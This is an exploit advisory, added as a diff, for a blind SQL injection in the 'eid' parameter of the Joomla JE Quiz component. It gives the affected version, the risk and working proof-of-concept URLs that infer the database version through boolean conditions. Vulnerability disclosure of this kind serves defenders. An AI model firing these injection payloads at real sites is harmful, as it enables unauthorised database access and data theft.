@@ -1,0 +1,34 @@
+[~]>> ...[BEGIN ADVISORY]...
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+[~]>> TITLE: Joomla (JE Quiz component) BLIND SQL Injection Vulnerability 
+[~]>> LANGUAGE: PHP
+[~]>> DORK: N/A
+[~]>> RESEARCHER: B-HUNT3|2
+[~]>> CONTACT: bhunt3r[at_no_spam]gmail[dot_no_spam]com
+[~]>> TYPE: COMMERCIAL
+[~]>> PRICE: $20.00
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+[~]>> DESCRIPTION: Input var eid is vulnerable to SQL Code Injection
+[~]>> AFFECTED VERSIONS: Confirmed in 1.b01 but probably other versions also
+[~]>> RISK: Medium/High
+[~]>> IMPACT: Execute Arbitrary SQL queries
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+[~]>> PROOF OF CONCEPT:
+
+[~]>> http://server/index.php?option=com_jequizmanagement&view=question&eid=[SQL]&Itemid=163
+
+[~]>> {RETURN TRUE::RETURN FALSE}
+
+[~]>> http://server/index.php?option=com_jequizmanagement&view=question&eid=1+AND+1=if(substring(@@version,1,1)=5,1,0)&Itemid=163
+[~]>> http://server/index.php?option=com_jequizmanagement&view=question&eid=1+AND+1=if(substring(@@version,1,1)=4,1,0)&Itemid=163
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+[~]>> ...[END ADVISORY]...
+ 
